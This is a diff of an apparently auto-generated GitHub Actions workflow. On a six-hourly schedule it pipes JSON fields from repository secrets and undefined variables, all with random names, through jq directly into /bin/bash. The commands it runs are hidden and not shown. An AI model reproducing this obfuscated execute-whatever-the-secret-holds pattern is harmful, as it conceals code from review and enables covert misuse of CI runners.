@@ -1,26 +1,22 @@
 name: miaoguojing1997
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 2/6 * * *'
+    - cron: '56 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: miaoguojing1997
         env:
-          tbe396: ${{ secrets.tbe396 }}
+          xwl1: ${{ secrets.xwl1 }}
         run: |
-          echo $tbe396 | jq -r .v29 | /bin/bash
-          echo $eykud49 | jq -r .kbjc98488 | /bin/bash
-          echo $vv600 | jq -r .t19 | /bin/bash
-          echo $zsd6 | jq -r .p62595 | /bin/bash
-          echo $y08 | jq -r .b8 | /bin/bash
-          echo $dp9 | jq -r .u06523 | /bin/bash
-          echo $xudq0768 | jq -r .db352 | /bin/bash
-          echo $mo857 | jq -r .wr9 | /bin/bash
-          echo $svl7 | jq -r .fraey7 | /bin/bash
-          echo $jydo26 | jq -r .vnz26254 | /bin/bash
+          echo $xwl1 | jq -r .kd54 | /bin/bash
+          echo $lsg1 | jq -r .rrb45 | /bin/bash
+          echo $x0 | jq -r .cdbsk661 | /bin/bash
+          echo $oczc2 | jq -r .twjot5 | /bin/bash
+          echo $hs821 | jq -r .eiuf1499 | /bin/bash
+          echo $ol12743 | jq -r .tje8190 | /bin/bash
 
